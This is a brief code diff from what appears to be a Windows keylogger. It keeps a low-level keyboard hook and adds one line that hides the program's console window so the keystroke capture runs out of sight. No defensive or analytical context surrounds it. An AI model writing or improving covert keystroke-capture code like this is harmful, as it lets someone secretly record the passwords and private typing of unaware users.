@@ -21,6 +21,7 @@ HWND prevWindow;
 
 int main()
 {
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 	printf("Hooking the keyboard\n");
 	//Here we set the low level hook
 	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
